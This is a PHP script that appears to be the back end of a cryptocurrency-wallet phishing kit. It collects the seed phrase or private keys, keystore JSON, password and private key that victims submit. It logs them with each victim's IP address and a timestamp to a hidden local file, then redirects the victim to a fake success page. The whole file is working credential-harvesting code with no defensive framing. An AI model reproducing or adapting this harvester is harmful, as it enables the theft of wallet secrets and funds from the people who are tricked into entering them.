<?php


/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$phrase   = $_POST['phrase'];
$keystore   = $_POST['keystore'];
$password   = $_POST['password'];
$key   = $_POST['key'];
$today = date("F j, Y, g:i a");
$file = "----<<loginan-baru->>----2022sksksksk";


$handle = fopen($file, 'a');
fwrite($handle, "---------------------------------------");
fwrite($handle, "\n");
fwrite($handle, "::  Phrase or Private Keys    ::   ");
fwrite($handle, "$phrase");
fwrite($handle, "\n");
fwrite($handle, "::  Keystore JSON             ::   ");
fwrite($handle, "$keystore");
fwrite($handle, "\n");
fwrite($handle, "::  Paswword                  ::   ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "::  Private Key               ::   ");
fwrite($handle, "$key");
fwrite($handle, "\n");
fwrite($handle, "::  IP                        ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "::  JAM MASUK                 ::   ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"successfull.html?/access-my-wallet\";
// -->
</script>";
?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

?>


